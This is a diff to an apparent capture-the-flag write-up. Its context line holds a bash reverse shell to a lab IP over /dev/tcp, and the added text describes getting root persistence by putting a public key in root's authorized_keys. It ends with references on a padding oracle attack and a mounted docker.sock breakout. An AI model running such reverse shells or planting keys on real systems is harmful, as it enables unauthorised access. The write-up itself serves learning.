@@ -135,6 +135,30 @@ bash -i >&/dev/tcp/10.9.0.82/80 0>&1
 
 ![image](https://github.com/user-attachments/assets/a877fa3d-f0e6-4846-b87f-fff03f3006aa)
 
+- To gain access to the root system,you can add your public key to the root user's authorized_keys and gain root ssh access.The method will allow us login via ssh without password.
+
+![image](https://github.com/user-attachments/assets/a71153b1-ee51-46f8-bc67-0cbb3a622160)
+
+- SSH access-:
+
+![image](https://github.com/user-attachments/assets/cce211db-902a-4eb2-b0b4-d64df0b06bcb)
+
+-------------
+
+### THANKS FOR READING!!!
+
+-------------
+
+### REFERENCES-:
+
+- [Padding Oracle Attack](https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv)
+- [Mounted docker.sock](https://medium.com/owasp-vitcc/docker-breakout-mounted-docker-socket-76cb77794158)
+
+--------------
+
+
+
+
 
 
 
